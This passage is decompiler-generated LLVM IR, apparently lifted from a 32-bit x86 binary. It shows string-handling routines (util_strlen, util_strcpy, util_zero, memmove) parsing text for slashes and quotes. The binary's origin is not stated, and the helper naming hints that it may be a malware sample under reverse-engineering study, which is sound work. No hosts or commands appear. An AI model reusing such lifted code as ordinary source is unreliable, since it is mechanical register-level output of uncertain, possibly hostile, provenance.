  store i32 %v3_804a360, i32* %ebx.global-to-local, align 4
  %v1_804a367 = load i32, i32* @esp, align 4
  %v2_804a367 = add i32 %v1_804a367, -4
  %v3_804a367 = inttoptr i32 %v2_804a367 to i32*
  store i32 %v3_804a360, i32* %v3_804a367, align 4
  %v2_804a368 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a368, i32* @eax, align 4
  %v0_804a36d = load i32, i32* @esp, align 4
  %v1_804a36d = inttoptr i32 %v0_804a36d to i32*
  %v2_804a36d = load i32, i32* %v1_804a36d, align 4
  store i32 %v2_804a36d, i32* %edx.global-to-local, align 4
  %v3_804a36d = add i32 %v0_804a36d, 4
  %v0_804a36e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a36e = add i32 %v0_804a36e, %v2_804a368
  %v12_804a36e = icmp eq i32 %v2_804a36e, 0
  store i1 %v12_804a36e, i1* %zf.global-to-local, align 1
  store i32 %v2_804a36e, i32* @ebx, align 4
  %v1_804a370 = inttoptr i32 %v3_804a36d to i32*
  %v2_804a370 = load i32, i32* %v1_804a370, align 4
  store i32 %v2_804a370, i32* %ecx.global-to-local, align 4
  %v0_804a371 = load i32, i32* @esi, align 4
  store i32 %v0_804a371, i32* %v1_804a370, align 4
  %v0_804a372 = load i32, i32* @ebx, align 4
  store i32 %v0_804a372, i32* %v1_804a36d, align 4
  %v3_804a373 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804a373, i32* %eax.global-to-local, align 4
  %v0_804a378 = load i32, i32* @edi, align 4
  %v1_804a378 = add i32 %v0_804a378, 16
  %v2_804a378 = inttoptr i32 %v1_804a378 to i32*
  %v3_804a378 = load i32, i32* %v2_804a378, align 4
  %v1_804a37b = add i32 %v3_804a378, 1
  store i32 %v1_804a37b, i32* %eax.global-to-local, align 4
  %v0_804a37c = load i32, i32* @esp, align 4
  %v6_804a37c = icmp eq i32 %v0_804a37c, -16
  store i1 %v6_804a37c, i1* %zf.global-to-local, align 1
  store i32 %v1_804a37b, i32* %v2_804a378, align 4
  br label %dec_label_pc_804a221

dec_label_pc_804a387:                             ; preds = %dec_label_pc_804a4aa, %dec_label_pc_804a49c
  %v0_804a387 = phi i32 [ %v0_804a492, %dec_label_pc_804a49c ], [ %v2_804a4ba, %dec_label_pc_804a4aa ]
  %v1_804a387 = inttoptr i32 %v0_804a387 to i8*
  store i8 0, i8* %v1_804a387, align 1
  %v0_804a38d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804a38a

dec_label_pc_804a38a:                             ; preds = %dec_label_pc_804a4b2, %dec_label_pc_804a46c, %dec_label_pc_804a387
  %v0_804a38d = phi i32 [ %v0_804a492, %dec_label_pc_804a46c ], [ %v0_804a38d.pre, %dec_label_pc_804a387 ], [ %v0_804a4ba, %dec_label_pc_804a4b2 ]
  %v0_804a38a = load i32, i32* @esp, align 4
  %v9_804a38a = icmp eq i32 %v0_804a38a, 12
  store i1 %v9_804a38a, i1* %zf.global-to-local, align 1
  %v2_804a38d = add i32 %v0_804a38a, -16
  %v3_804a38d = inttoptr i32 %v2_804a38d to i32*
  store i32 %v0_804a38d, i32* %v3_804a38d, align 4
  %v2_804a38e = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a38e, i32* %eax.global-to-local, align 4
  %v0_804a393 = load i32, i32* @esp, align 4
  %v1_804a393 = add i32 %v0_804a393, 16
  %v1_804a396 = icmp eq i32 %v2_804a38e, 0
  store i1 %v1_804a396, i1* %zf.global-to-local, align 1
  %tmp132 = icmp slt i32 %v2_804a38e, 1
  br i1 %tmp132, label %dec_label_pc_804a3c0, label %dec_label_pc_804a39a

dec_label_pc_804a39a:                             ; preds = %dec_label_pc_804a38a
  %v9_804a39a = icmp eq i32 %v0_804a393, -4
  store i1 %v9_804a39a, i1* %zf.global-to-local, align 1
  %v0_804a39d = load i32, i32* @ebx, align 4
  %v3_804a39d = inttoptr i32 %v0_804a393 to i32*
  store i32 %v0_804a39d, i32* %v3_804a39d, align 4
  %v2_804a39e = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a39e, i32* %eax.global-to-local, align 4
  %v0_804a3a3 = load i32, i32* @esp, align 4
  %v1_804a3a3 = add i32 %v0_804a3a3, 16
  %v1_804a3a6 = add i32 %v2_804a39e, -127
  %v6_804a3a6 = sub i32 126, %v2_804a39e
  %v7_804a3a6 = and i32 %v6_804a3a6, %v2_804a39e
  %v8_804a3a6 = icmp slt i32 %v7_804a3a6, 0
  %v9_804a3a6 = icmp eq i32 %v1_804a3a6, 0
  store i1 %v9_804a3a6, i1* %zf.global-to-local, align 1
  %v10_804a3a6 = icmp slt i32 %v1_804a3a6, 0
  %v3_804a3a9 = icmp eq i1 %v10_804a3a6, %v8_804a3a6
  %v4_804a3a9 = icmp eq i1 %v9_804a3a6, false
  %v5_804a3a9 = and i1 %v4_804a3a9, %v3_804a3a9
  br i1 %v5_804a3a9, label %dec_label_pc_804a3c0, label %dec_label_pc_804a3ab

dec_label_pc_804a3ab:                             ; preds = %dec_label_pc_804a39a
  %v0_804a3ab = load i32, i32* @ecx, align 4
  %v2_804a3ab = add i32 %v0_804a3a3, 12
  %v3_804a3ab = inttoptr i32 %v2_804a3ab to i32*
  store i32 %v0_804a3ab, i32* %v3_804a3ab, align 4
  %v0_804a3ac = load i32, i32* @ecx, align 4
  %v2_804a3ac = add i32 %v0_804a3a3, 8
  %v3_804a3ac = inttoptr i32 %v2_804a3ac to i32*
  store i32 %v0_804a3ac, i32* %v3_804a3ac, align 4
  %v0_804a3ad = load i32, i32* @ebx, align 4
  %v2_804a3ad = add i32 %v0_804a3a3, 4
  %v3_804a3ad = inttoptr i32 %v2_804a3ad to i32*
  store i32 %v0_804a3ad, i32* %v3_804a3ad, align 4
  %v1_804a3ae = add i32 %v0_804a3a3, 112
  %v2_804a3ae = inttoptr i32 %v1_804a3ae to i32*
  %v3_804a3ae = load i32, i32* %v2_804a3ae, align 4
  %v1_804a3b2 = add i32 %v3_804a3ae, 789
  %v9_804a3b2 = icmp eq i32 %v1_804a3b2, 0
  store i1 %v9_804a3b2, i1* %zf.global-to-local, align 1
  store i32 %v1_804a3b2, i32* @eax, align 4
  %v3_804a3b7 = inttoptr i32 %v0_804a3a3 to i32*
  store i32 %v1_804a3b2, i32* %v3_804a3b7, align 4
  %v3_804a3b8 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804a3b8, i32* %eax.global-to-local, align 4
  %v0_804a3bd = load i32, i32* @esp, align 4
  %v1_804a3bd = add i32 %v0_804a3bd, 16
  %v6_804a3bd = icmp eq i32 %v1_804a3bd, 0
  store i1 %v6_804a3bd, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804a3c0

dec_label_pc_804a3c0:                             ; preds = %dec_label_pc_804a39a, %dec_label_pc_804a38a, %dec_label_pc_804a140, %dec_label_pc_804a3ab
  %v0_804a3c0 = phi i32 [ %v1_804a3a3, %dec_label_pc_804a39a ], [ %v1_804a393, %dec_label_pc_804a38a ], [ %v1_804a134, %dec_label_pc_804a140 ], [ %v1_804a3bd, %dec_label_pc_804a3ab ]
  %v0_804a3c3 = load i32, i32* @ebx, align 4
  %v1_804a3c3 = add i32 %v0_804a3c3, 1
  store i32 %v1_804a3c3, i32* @ebx, align 4
  store i32 %v1_804a3c3, i32* %eax.global-to-local, align 4
  %v1_804a3c6 = add i32 %v0_804a3c0, 20900
  %v2_804a3c6 = inttoptr i32 %v1_804a3c6 to i32*
  %v3_804a3c6 = load i32, i32* %v2_804a3c6, align 4
  store i32 %v3_804a3c6, i32* %edx.global-to-local, align 4
  %v2_804a3cd = add i32 %v3_804a3c6, %v1_804a3c3
  %v12_804a3cd = icmp eq i32 %v2_804a3cd, 0
  store i1 %v12_804a3cd, i1* %zf.global-to-local, align 1
  store i32 %v2_804a3cd, i32* %eax.global-to-local, align 4
  %v2_804a3cf = add i32 %v0_804a3c0, -16
  %v3_804a3cf = inttoptr i32 %v2_804a3cf to i32*
  store i32 %v2_804a3cd, i32* %v3_804a3cf, align 4
  %v2_804a3d0 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a3d0, i32* @eax, align 4
  %v0_804a3d5 = load i32, i32* @esp, align 4
  %v1_804a3d5 = add i32 %v0_804a3d5, 16
  %v1_804a3d8 = add i32 %v2_804a3d0, -255
  %v6_804a3d8 = sub i32 254, %v2_804a3d0
  %v7_804a3d8 = and i32 %v6_804a3d8, %v2_804a3d0
  %v8_804a3d8 = icmp slt i32 %v7_804a3d8, 0
  %v9_804a3d8 = icmp eq i32 %v1_804a3d8, 0
  store i1 %v9_804a3d8, i1* %zf.global-to-local, align 1
  %v10_804a3d8 = icmp slt i32 %v1_804a3d8, 0
  %v3_804a3dd = icmp eq i1 %v10_804a3d8, %v8_804a3d8
  %v4_804a3dd = icmp eq i1 %v9_804a3d8, false
  %v5_804a3dd = and i1 %v4_804a3dd, %v3_804a3dd
  br i1 %v5_804a3dd, label %dec_label_pc_804a149, label %dec_label_pc_804a3e3

dec_label_pc_804a3e3:                             ; preds = %dec_label_pc_804a3c0
  %v1_804a3e3 = add i32 %v0_804a3d5, 112
  %v2_804a3e3 = inttoptr i32 %v1_804a3e3 to i32*
  %v3_804a3e3 = load i32, i32* %v2_804a3e3, align 4
  store i32 %v3_804a3e3, i32* %esi.global-to-local, align 4
  %v0_804a3e7 = load i32, i32* @ebp, align 4
  %v2_804a3e7 = add i32 %v0_804a3d5, 12
  %v3_804a3e7 = inttoptr i32 %v2_804a3e7 to i32*
  store i32 %v0_804a3e7, i32* %v3_804a3e7, align 4
  %v0_804a3e8 = load i32, i32* %esi.global-to-local, align 4
  %v1_804a3e8 = add i32 %v0_804a3e8, 533
  %v9_804a3e8 = icmp eq i32 %v1_804a3e8, 0
  store i1 %v9_804a3e8, i1* %zf.global-to-local, align 1
  store i32 %v1_804a3e8, i32* @esi, align 4
  %v0_804a3ee = load i32, i32* @ebp, align 4
  %v2_804a3ee = add i32 %v0_804a3d5, 8
  %v3_804a3ee = inttoptr i32 %v2_804a3ee to i32*
  store i32 %v0_804a3ee, i32* %v3_804a3ee, align 4
  %v1_804a3ef = add i32 %v0_804a3d5, 4
  %v2_804a3ef = inttoptr i32 %v1_804a3ef to i32*
  store i32 255, i32* %v2_804a3ef, align 4
  %v0_804a3f4 = load i32, i32* @esi, align 4
  %v3_804a3f4 = inttoptr i32 %v0_804a3d5 to i32*
  store i32 %v0_804a3f4, i32* %v3_804a3f4, align 4
  %v2_804a3f5 = call i32 @util_zero(i32 %stack_var_-20888.0, i32 %v3_8048a9f)
  store i32 %v2_804a3f5, i32* %eax.global-to-local, align 4
  %v0_804a3fa = load i32, i32* @esp, align 4
  %v1_804a3fa = inttoptr i32 %v0_804a3fa to i32*
  %v2_804a3fa = load i32, i32* %v1_804a3fa, align 4
  store i32 %v2_804a3fa, i32* %ecx.global-to-local, align 4
  %v0_804a3fb = load i32, i32* @ebx, align 4
  store i32 %v0_804a3fb, i32* %eax.global-to-local, align 4
  %v1_804a3fd = add i32 %v0_804a3fa, 20916
  %v2_804a3fd = inttoptr i32 %v1_804a3fd to i32*
  %v3_804a3fd = load i32, i32* %v2_804a3fd, align 4
  store i32 %v3_804a3fd, i32* %edx.global-to-local, align 4
  %v2_804a404 = add i32 %v3_804a3fd, %v0_804a3fb
  %v12_804a404 = icmp eq i32 %v2_804a404, 0
  store i1 %v12_804a404, i1* %zf.global-to-local, align 1
  store i32 %v2_804a404, i32* %eax.global-to-local, align 4
  store i32 %v2_804a404, i32* %v1_804a3fa, align 4
  %v2_804a407 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a407, i32* @eax, align 4
  %v0_804a40c = load i32, i32* @esp, align 4
  %v1_804a40c = add i32 %v0_804a40c, 16
  %v1_804a40f = icmp eq i32 %v2_804a407, 0
  store i1 %v1_804a40f, i1* %zf.global-to-local, align 1
  %tmp133 = icmp slt i32 %v2_804a407, 1
  br i1 %tmp133, label %dec_label_pc_804a149, label %dec_label_pc_804a417

dec_label_pc_804a417:                             ; preds = %dec_label_pc_804a3e3
  %v2_804a417 = add i32 %v0_804a40c, 12
  %v3_804a417 = inttoptr i32 %v2_804a417 to i32*
  store i32 %v2_804a407, i32* %v3_804a417, align 4
  %v2_804a418 = add i32 %v0_804a40c, 8
  %v3_804a418 = inttoptr i32 %v2_804a418 to i32*
  store i32 %v2_804a407, i32* %v3_804a418, align 4
  %v1_804a419 = add i32 %v0_804a40c, 20916
  %v2_804a419 = inttoptr i32 %v1_804a419 to i32*
  %v3_804a419 = load i32, i32* %v2_804a419, align 4
  store i32 %v3_804a419, i32* @ebp, align 4
  %v0_804a420 = load i32, i32* @ebx, align 4
  %v2_804a420 = add i32 %v0_804a420, %v3_804a419
  %v12_804a420 = icmp eq i32 %v2_804a420, 0
  store i1 %v12_804a420, i1* %zf.global-to-local, align 1
  store i32 %v2_804a420, i32* @ebx, align 4
  %v2_804a422 = add i32 %v0_804a40c, 4
  %v3_804a422 = inttoptr i32 %v2_804a422 to i32*
  store i32 %v2_804a420, i32* %v3_804a422, align 4
  %v0_804a423 = load i32, i32* @esi, align 4
  %v3_804a423 = inttoptr i32 %v0_804a40c to i32*
  store i32 %v0_804a423, i32* %v3_804a423, align 4
  %v3_804a424 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804a424, i32* %eax.global-to-local, align 4
  %v0_804a429 = load i32, i32* @esp, align 4
  %v1_804a429 = add i32 %v0_804a429, 16
  %v6_804a429 = icmp eq i32 %v1_804a429, 0
  store i1 %v6_804a429, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804a149

dec_label_pc_804a431:                             ; preds = %dec_label_pc_804a234
  %v0_804a431 = load i32, i32* @esp, align 4
  %v1_804a431 = add i32 %v0_804a431, 20900
  %v2_804a431 = inttoptr i32 %v1_804a431 to i32*
  store i32 8, i32* %v2_804a431, align 4
  br label %dec_label_pc_804a249

dec_label_pc_804a441:                             ; preds = %dec_label_pc_804a02f
  %v0_804a441 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a441 = add i32 %v0_804a441, 2
  store i32 %v1_804a441, i32* %eax.global-to-local, align 4
  %v1_804a444 = load i32, i32* @esp, align 4
  %v2_804a444 = add i32 %v1_804a444, 20900
  %v3_804a444 = inttoptr i32 %v2_804a444 to i32*
  store i32 %v1_804a441, i32* %v3_804a444, align 4
  %v0_804a050.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804a04d

dec_label_pc_804a450:                             ; preds = %dec_label_pc_804a111
  %v1_804a450 = add i32 %v0_804a134, 20916
  %v2_804a450 = inttoptr i32 %v1_804a450 to i32*
  store i32 7, i32* %v2_804a450, align 4
  %v0_804a45b = load i32, i32* @ebx, align 4
  %v1_804a45b = add i32 %v0_804a45b, 4
  %v2_804a45b = inttoptr i32 %v1_804a45b to i8*
  %v3_804a45b = load i8, i8* %v2_804a45b, align 1
  %v12_804a45b = icmp eq i8 %v3_804a45b, 115
  store i1 %v12_804a45b, i1* %zf.global-to-local, align 1
  %v1_804a45f = icmp eq i1 %v12_804a45b, false
  br i1 %v1_804a45f, label %dec_label_pc_804a46c, label %dec_label_pc_804a461

dec_label_pc_804a461:                             ; preds = %dec_label_pc_804a450
  %v0_804a461 = load i32, i32* @esp, align 4
  %v1_804a461 = add i32 %v0_804a461, 20900
  %v2_804a461 = inttoptr i32 %v1_804a461 to i32*
  store i32 8, i32* %v2_804a461, align 4
  br label %dec_label_pc_804a46c

dec_label_pc_804a46c:                             ; preds = %dec_label_pc_804a450, %dec_label_pc_804a461
  %v0_804a46c = load i32, i32* @esp, align 4
  %v1_804a46c = add i32 %v0_804a46c, 20900
  %v2_804a46c = inttoptr i32 %v1_804a46c to i32*
  %v3_804a46c = load i32, i32* %v2_804a46c, align 4
  store i32 %v3_804a46c, i32* %edx.global-to-local, align 4
  %v0_804a473 = load i32, i32* @esi, align 4
  %v2_804a473 = add i32 %v0_804a46c, -4
  %v3_804a473 = inttoptr i32 %v2_804a473 to i32*
  store i32 %v0_804a473, i32* %v3_804a473, align 4
  %v0_804a474 = load i32, i32* @ebp, align 4
  %v1_804a474 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a474 = sub i32 %v0_804a474, %v1_804a474
  %v12_804a474 = icmp eq i32 %v2_804a474, 0
  store i1 %v12_804a474, i1* %zf.global-to-local, align 1
  store i32 %v2_804a474, i32* @ebp, align 4
  %v0_804a476 = load i32, i32* @ebx, align 4
  %v2_804a476 = add i32 %v0_804a476, %v1_804a474
  store i32 %v2_804a476, i32* %edx.global-to-local, align 4
  %v1_804a479 = add i32 %v2_804a474, 1
  store i32 %v1_804a479, i32* %eax.global-to-local, align 4
  %v2_804a47c = add i32 %v0_804a46c, -8
  %v3_804a47c = inttoptr i32 %v2_804a47c to i32*
  store i32 %v1_804a479, i32* %v3_804a47c, align 4
  %v0_804a47d = load i32, i32* %edx.global-to-local, align 4
  %v2_804a47d = add i32 %v0_804a46c, -12
  %v3_804a47d = inttoptr i32 %v2_804a47d to i32*
  store i32 %v0_804a47d, i32* %v3_804a47d, align 4
  %v0_804a47e = load i32, i32* @ebx, align 4
  %v2_804a47e = add i32 %v0_804a46c, -16
  %v3_804a47e = inttoptr i32 %v2_804a47e to i32*
  store i32 %v0_804a47e, i32* %v3_804a47e, align 4
  %v4_804a47f = call i32 @memmove(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804a47f, i32* %eax.global-to-local, align 4
  %v0_804a484 = load i32, i32* @esp, align 4
  %v1_804a484 = add i32 %v0_804a484, 20916
  %v2_804a484 = inttoptr i32 %v1_804a484 to i32*
  store i32 0, i32* %v2_804a484, align 4
  %v0_804a48f = load i32, i32* @esp, align 4
  %v1_804a48f = add i32 %v0_804a48f, 16
  %v6_804a48f = icmp eq i32 %v1_804a48f, 0
  store i1 %v6_804a48f, i1* %zf.global-to-local, align 1
  %v0_804a492 = load i32, i32* @ebx, align 4
  %v1_804a492 = inttoptr i32 %v0_804a492 to i8*
  %v2_804a492 = load i8, i8* %v1_804a492, align 1
  %v3_804a492 = zext i8 %v2_804a492 to i32
  %v5_804a492 = and i32 %v4_804a47f, -256
  %v6_804a492 = or i32 %v3_804a492, %v5_804a492
  store i32 %v6_804a492, i32* %eax.global-to-local, align 4
  %v4_804a494 = icmp eq i8 %v2_804a492, 0
  store i1 %v4_804a494, i1* %zf.global-to-local, align 1
  br i1 %v4_804a494, label %dec_label_pc_804a38a, label %dec_label_pc_804a49c

dec_label_pc_804a49c:                             ; preds = %dec_label_pc_804a46c
  store i32 %v0_804a492, i32* %edx.global-to-local, align 4
  %v10_804a49e = icmp eq i8 %v2_804a492, 47
  store i1 %v10_804a49e, i1* %zf.global-to-local, align 1
  br i1 %v10_804a49e, label %dec_label_pc_804a387, label %dec_label_pc_804a4a6

dec_label_pc_804a4a6:                             ; preds = %dec_label_pc_804a49c
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804a4b2

dec_label_pc_804a4aa:                             ; preds = %dec_label_pc_804a4b2
  %v10_804a4aa = icmp eq i8 %v2_804a4bd, 47
  store i1 %v10_804a4aa, i1* %zf.global-to-local, align 1
  br i1 %v10_804a4aa, label %dec_label_pc_804a387, label %dec_label_pc_804a4aa.dec_label_pc_804a4b2_crit_edge

dec_label_pc_804a4aa.dec_label_pc_804a4b2_crit_edge: ; preds = %dec_label_pc_804a4aa
  %v1_804a4b3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a4b2

dec_label_pc_804a4b2:                             ; preds = %dec_label_pc_804a4aa.dec_label_pc_804a4b2_crit_edge, %dec_label_pc_804a4a6
  %v1_804a4b3 = phi i32 [ %v1_804a4b3.pre, %dec_label_pc_804a4aa.dec_label_pc_804a4b2_crit_edge ], [ %v1_804a48f, %dec_label_pc_804a4a6 ]
  %v0_804a4b2 = phi i32 [ %v1_804a4ba, %dec_label_pc_804a4aa.dec_label_pc_804a4b2_crit_edge ], [ 0, %dec_label_pc_804a4a6 ]
  %v1_804a4b2 = add i32 %v0_804a4b2, 1
  %v8_804a4b2 = icmp eq i32 %v1_804a4b2, 0
  store i1 %v8_804a4b2, i1* %zf.global-to-local, align 1
  store i32 %v1_804a4b2, i32* @ecx, align 4
  %v2_804a4b3 = add i32 %v1_804a4b3, 20900
  %v3_804a4b3 = inttoptr i32 %v2_804a4b3 to i32*
  store i32 %v1_804a4b2, i32* %v3_804a4b3, align 4
  %v0_804a4ba = load i32, i32* @ebx, align 4
  %v1_804a4ba = load i32, i32* @ecx, align 4
  %v2_804a4ba = add i32 %v1_804a4ba, %v0_804a4ba
  store i32 %v2_804a4ba, i32* %edx.global-to-local, align 4
  %v1_804a4bd = inttoptr i32 %v2_804a4ba to i8*
  %v2_804a4bd = load i8, i8* %v1_804a4bd, align 1
  %v3_804a4bd = zext i8 %v2_804a4bd to i32
  %v4_804a4bd = load i32, i32* %eax.global-to-local, align 4
  %v5_804a4bd = and i32 %v4_804a4bd, -256
  %v6_804a4bd = or i32 %v5_804a4bd, %v3_804a4bd
  store i32 %v6_804a4bd, i32* %eax.global-to-local, align 4
  %v4_804a4bf = icmp eq i8 %v2_804a4bd, 0
  store i1 %v4_804a4bf, i1* %zf.global-to-local, align 1
  %v1_804a4c1 = icmp eq i1 %v4_804a4bf, false
  br i1 %v1_804a4c1, label %dec_label_pc_804a4aa, label %dec_label_pc_804a38a

dec_label_pc_804a4c8:                             ; preds = %dec_label_pc_804a0c2
  %v1_804a4c8 = add i32 %v3_804a0c2, 1
  store i32 %v1_804a4c8, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a4c8, i32* %v2_804a0c2, align 4
  %v0_804a4d2 = load i32, i32* @esp, align 4
  %v9_804a4d2 = icmp eq i32 %v0_804a4d2, 12
  store i1 %v9_804a4d2, i1* %zf.global-to-local, align 1
  %v0_804a4d5 = load i32, i32* @esi, align 4
  %v1_804a4d5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804a4d5 = add i32 %v1_804a4d5, %v0_804a4d5
  store i32 %v2_804a4d5, i32* @ebx, align 4
  %v2_804a4d8 = add i32 %v0_804a4d2, -16
  %v3_804a4d8 = inttoptr i32 %v2_804a4d8 to i32*
  store i32 %v2_804a4d5, i32* %v3_804a4d8, align 4
  %v2_804a4d9 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a4d9, i32* @eax, align 4
  %v0_804a4de = load i32, i32* @esp, align 4
  %v1_804a4de = add i32 %v0_804a4de, 16
  %v6_804a4de = icmp eq i32 %v1_804a4de, 0
  store i1 %v6_804a4de, i1* %zf.global-to-local, align 1
  %v0_804a4e1 = load i32, i32* @ebx, align 4
  %v2_804a4e1 = add i32 %v2_804a4d9, -1
  %v3_804a4e1 = add i32 %v2_804a4e1, %v0_804a4e1
  %v4_804a4e1 = inttoptr i32 %v3_804a4e1 to i8*
  %v5_804a4e1 = load i8, i8* %v4_804a4e1, align 1
  %v14_804a4e1 = icmp eq i8 %v5_804a4e1, 34
  store i1 %v14_804a4e1, i1* %zf.global-to-local, align 1
  %v1_804a4e6 = icmp eq i1 %v14_804a4e1, false
  br i1 %v1_804a4e6, label %dec_label_pc_804a0d3, label %dec_label_pc_804a4ec

dec_label_pc_804a4ec:                             ; preds = %dec_label_pc_804a4c8
  %v1_804a4ec = add i32 %v0_804a4de, 20916
  %v2_804a4ec = inttoptr i32 %v1_804a4ec to i32*
  %v3_804a4ec = load i32, i32* %v2_804a4ec, align 4
  store i32 %v3_804a4ec, i32* %eax.global-to-local, align 4
  %v0_804a4f3 = load i32, i32* @esi, align 4
  %v2_804a4f8 = add i32 %v0_804a4f3, %v3_804a4ec
  %v12_804a4f8 = icmp eq i32 %v2_804a4f8, 0
  store i1 %v12_804a4f8, i1* %zf.global-to-local, align 1
  store i32 %v2_804a4f8, i32* @ebx, align 4
  %v3_804a4fa = inttoptr i32 %v0_804a4de to i32*
  store i32 %v2_804a4f8, i32* %v3_804a4fa, align 4
  %v2_804a4fb = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_804a4fb, i32* @eax, align 4
  %v0_804a500 = load i32, i32* @esp, align 4
  %v6_804a500 = icmp eq i32 %v0_804a500, -16
  store i1 %v6_804a500, i1* %zf.global-to-local, align 1
  %v0_804a503 = load i32, i32* @ebx, align 4
  %v2_804a503 = add i32 %v2_804a4fb, -1
  %v3_804a503 = add i32 %v2_804a503, %v0_804a503
  %v4_804a503 = inttoptr i32 %v3_804a503 to i8*
  store i8 0, i8* %v4_804a503, align 1
  %v0_804a0d3.pre = load i32, i32* @eax, align 4
  %v1_804a0d3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a0d3

dec_label_pc_804a510:                             ; preds = %dec_label_pc_8049cec
  %v0_804a510 = load i32, i32* @ecx, align 4
  %v2_804a510 = add i32 %v0_8049cf5, 12
  %v3_804a510 = inttoptr i32 %v2_804a510 to i32*
  store i32 %v0_804a510, i32* %v3_804a510, align 4
  %v0_804a511 = load i32, i32* @ecx, align 4
  %v2_804a511 = add i32 %v0_8049cf5, 8
  %v3_804a511 = inttoptr i32 %v2_804a511 to i32*
  store i32 %v0_804a511, i32* %v3_804a511, align 4
  %v0_804a512 = load i32, i32* @esi, align 4
  %v2_804a512 = add i32 %v0_8049cf5, 4
  %v3_804a512 = inttoptr i32 %v2_804a512 to i32*
  store i32 %v0_804a512, i32* %v3_804a512, align 4
  %v1_804a513 = add i32 %v0_8049cf5, 112
  %v2_804a513 = inttoptr i32 %v1_804a513 to i32*
  %v3_804a513 = load i32, i32* %v2_804a513, align 4
  %v1_804a517 = add i32 %v3_804a513, 789
  %v9_804a517 = icmp eq i32 %v1_804a517, 0
  store i1 %v9_804a517, i1* %zf.global-to-local, align 1
  store i32 %v1_804a517, i32* @eax, align 4
  %v3_804a51c = inttoptr i32 %v0_8049cf5 to i32*
  store i32 %v1_804a517, i32* %v3_804a51c, align 4
  %v3_804a51d = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_804a51d, i32* %eax.global-to-local, align 4
  %v0_804a522 = load i32, i32* @esp, align 4
  %v1_804a522 = add i32 %v0_804a522, 16
  %v6_804a522 = icmp eq i32 %v1_804a522, 0
  store i1 %v6_804a522, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049d01

dec_label_pc_804a55a:                             ; preds = %dec_label_pc_8048baa, %dec_label_pc_804a65e, %dec_label_pc_804a629, %dec_label_pc_804a5f4, %dec_label_pc_804a5bf
  %v1_804a55a = phi i32 [ %v0_8048bc0, %dec_label_pc_8048baa ], [ %v1_804a68b, %dec_label_pc_804a65e ], [ %v1_804a656, %dec_label_pc_804a629 ], [ %v1_804a621, %dec_label_pc_804a5f4 ], [ %v1_804a5ec, %dec_label_pc_804a5bf ]
  %v0_804a55a = phi i32 [ %v2_8048bcc, %dec_label_pc_8048baa ], [ %v2_804a686, %dec_label_pc_804a65e ], [ %v2_804a651, %dec_label_pc_804a629 ], [ %v2_804a61c, %dec_label_pc_804a5f4 ], [ %v2_804a5e7, %dec_label_pc_804a5bf ]
  %v2_804a55a = add i32 %v1_804a55a, -4
  %v3_804a55a = inttoptr i32 %v2_804a55a to i32*
  store i32 %v0_804a55a, i32* %v3_804a55a, align 4
  %v0_804a55b = load i32, i32* %eax.global-to-local, align 4
  %v2_804a55b = add i32 %v1_804a55a, -8
  %v3_804a55b = inttoptr i32 %v2_804a55b to i32*
  store i32 %v0_804a55b, i32* %v3_804a55b, align 4
  %v1_804a55c = add i32 %v1_804a55a, 84
  %v2_804a55c = inttoptr i32 %v1_804a55c to i32*
  %v3_804a55c = load i32, i32* %v2_804a55c, align 4
  store i32 %v3_804a55c, i32* %eax.global-to-local, align 4
  %v0_804a560 = load i32, i32* @esi, align 4
  %v1_804a560 = add i32 %v0_804a560, 3140
  %v9_804a560 = icmp eq i32 %v1_804a560, 0
  store i1 %v9_804a560, i1* %zf.global-to-local, align 1
  store i32 %v1_804a560, i32* @esi, align 4
  %v2_804a566 = add i32 %v1_804a55a, -12
  %v3_804a566 = inttoptr i32 %v2_804a566 to i32*
  store i32 %v3_804a55c, i32* %v3_804a566, align 4
  %v1_804a567 = add i32 %v1_804a55a, 44
  %v2_804a567 = inttoptr i32 %v1_804a567 to i32*
  %v3_804a567 = load i32, i32* %v2_804a567, align 4
  store i32 %v3_804a567, i32* @eax, align 4
  %v2_804a56b = add i32 %v1_804a55a, -16
  %v3_804a56b = inttoptr i32 %v2_804a56b to i32*
  store i32 %v3_804a567, i32* %v3_804a56b, align 4
  %v3_804a56c = call i32 @util_strcpy(i8* %v2_804a56c, i32 %v0_80488b2)
  store i32 %v3_804a56c, i32* %eax.global-to-local, align 4
  %v0_804a571 = load i32, i32* @esp, align 4
  %v1_804a571 = add i32 %v0_804a571, 84
  %v2_804a571 = inttoptr i32 %v1_804a571 to i32*
  %v3_804a571 = load i32, i32* %v2_804a571, align 4
  %v1_804a575 = add i32 %v3_804a571, 1
  store i32 %v1_804a575, i32* %v2_804a571, align 4
  %v0_804a57a = load i32, i32* @esp, align 4
  %v1_804a57d = add i32 %v0_804a57a, 120
  %v2_804a57d = inttoptr i32 %v1_804a57d to i32*
  %v3_804a57d = load i32, i32* %v2_804a57d, align 4
  store i32 %v3_804a57d, i32* %edx.global-to-local, align 4
  %v1_804a581 = add i32 %v0_804a57a, 84
  %v2_804a581 = inttoptr i32 %v1_804a581 to i32*
